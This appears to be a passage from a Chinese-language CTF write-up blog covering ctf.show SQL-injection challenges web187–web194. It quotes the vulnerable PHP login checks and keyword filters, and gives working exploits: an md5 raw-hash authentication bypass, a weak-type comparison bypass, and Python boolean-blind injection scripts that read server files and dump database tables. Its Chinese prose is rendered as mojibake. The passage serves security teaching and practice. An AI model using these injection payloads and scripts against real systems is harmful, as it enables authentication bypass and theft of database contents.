<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åªæœ‰adminå¯ä»¥è·å¾—flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åä¸å­˜åœ¨&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“MD5å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueæ—¶ï¼Œè¿”å›çš„æ˜¯å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>,<span class="literal">true</span>)= <span class="string">&#x27;or&#x27;</span><span class="number">6</span>\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ‰”è¿›<code>sql</code>è¯­å¥ä¸­æ­£å¥½èƒ½é—­åˆå¹¶ä¸”<code>or</code>åé¢æ˜¯ä¸ªå®Œæ•´å­—ç¬¦ä¸²ä¸”å¼€å¤´ä¸º<code>6</code>ï¼Œæ•…æ’ä¸ºçœŸï¼ˆè²Œä¼¼å­—ç¬¦ä¸²å’Œä¸€ä¸ªé0æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²å»<code>or</code>ç»“æœæ’ä¸ºçœŸï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=ffifdyop</span><br></pre></td></tr></table></figure>

<h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç”¨æˆ·åæ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡ç”¨å•å¼•å·ä¿æŠ¤è¾“å…¥ï¼Œå¼±ç±»å‹æ¯”è¾ƒï¼Œè€Œä¸”å¯†ç å“ªé‡Œæ¯”è¾ƒä¹Ÿæ˜¯<code>==</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0</span><br><span class="line">password=0</span><br></pre></td></tr></table></figure>

<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>æç¤ºflagåœ¨api&#x2F;index.phpæ–‡ä»¶ä¸­</p>
<p>æµ‹è¯•åå‘ç°ï¼Œ<code>username=1</code>æ—¶</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u67e5\u8be2\u5931\u8d25&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>username=0</code>æ—¶</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u5bc6\u7801\u9519\u8bef&quot;</span><span class="punctuation">,</span><span class="attr">&quot;count&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç¼–å†™è„šæœ¬ç›²æ³¨æ–‡ä»¶å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5867279f-effb-40ab-9261-8c7b435da821.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">content = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>,<span class="number">257</span>+<span class="number">60</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">      data = &#123;</span><br><span class="line">          <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,1,0)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      response = requests.post(url=url, data=data)</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;8d25&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">          content += <span class="built_in">chr</span>(j)</span><br><span class="line">          <span class="built_in">print</span>(content)</span><br><span class="line">          <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>æç¤º<code>ä¸é¥¿</code>ï¼Œåº”è¯¥æ˜¯<code>å¸ƒå°”ç›²æ³¨</code></p>
<p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span></span><br></pre></td></tr></table></figure>

<p>å®¹æ˜“çŸ¥é“<code>admin</code>æ˜¯ç”¨æˆ·åï¼Œåˆ©ç”¨<code>ç”¨æˆ·åå­˜åœ¨ä½†å¯†ç é”™è¯¯</code>å’Œ<code>ç”¨æˆ·åä¸å­˜åœ¨</code>è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼ŒäºŒåˆ†æ³•ä¼šæ¯”è¾ƒå¿«</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0141af7b-45d8-4912-aa34-55e7d58fed51.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;b9599df1-1080-4bbb-a6d0-2a2c8ad4fd63&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and (ascii(substr((select group_concat(f1ag)from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br></pre></td></tr></table></figure>

<h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>ascii</code>è¢«ç¦ç”¨äº†ï¼Œæ”¹ç”¨<code>ord</code>å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ff11f70e-c0c6-4a92-8f4e-5c532108b4fa.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ord(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ord(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and (ord(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;18873d0a-9f29-4595-99a5-cff10326c9f2&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and (ord(substr((select group_concat(f1ag)from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            r = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid</span><br></pre></td></tr></table></figure>

<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç”¨å­—ç¬¦å°±å¥½ï¼Œè®°å¾—å¾—åˆ°çš„ç»“æœè¦è½¬å°å†™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://67bbafbb-f32e-4e33-bc12-b1281048ea86.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(substr((select database()),&#123;i&#125;,1)=&#x27;&#123;chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1)=&#x27;&#123;chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)=&#x27;&#123;chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># CTFSHOW&#123;3AD5D88C-7A43-4D0E-99A2-AC23D5ED9749&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and if(substr((select group_concat(f1ag)from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span>&#x27;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">substr`è¢«ç¦ç”¨ï¼Œä½¿ç”¨`left`ä»£æ›¿ï¼ˆæ³¨æ„è¡¨åå˜äº†ï¼Œè¿˜æœ‰ç»“æœè®°å¾—å°å†™ï¼‰ï¼Œ`web193`å’Œ`web194`ä¹Ÿå¯ä»¥ç”¨`mid</span><br><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a68f5cff-2cf6-4627-99ec-df3b012a8531.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(left((select database()),&#123;i&#125;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flxg,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(left((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(left((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;i&#125;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># CTFSHOW&#123;ECF80221-1B4B-40A3-8AED-A1D11B0E1555&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and if(left((select group_concat(f1ag)from ctfshow_flxg),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+<span class="built_in">chr</span>(j)&#125;</span>&#x27;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>ä½¿ç”¨<code>lpad</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8264940f-695b-406b-8033-9051e766a595.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(lpad((select database()),&#123;i&#125;,&#x27;&#x27;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flxg,ctfshow_user</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(lpad((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,&#x27;&#x27;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,f1ag</span></span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;admin&#x27;and if(lpad((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;i&#125;,&#x27;&#x27;)=&#x27;&#123;flag+chr(j)&#125;&#x27;,1,0)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;ecda663f-20f8-4743-b573-4fe3c2038239&#125;</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27;and if(lpad((select group_concat(f1ag)from ctfshow_flxg),<span class="subst">&#123;i&#125;</span>,&#x27;&#x27;)=&#x27;<span class="subst">&#123;flag+<span class="built_in">chr</span>(j)&#125;</span>&#x27;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;8bef&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># print(flag.lower())</span></span><br></pre></td></tr></table></figure>

<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><p>æŸ¥è¯¢è¯­å¥</p>
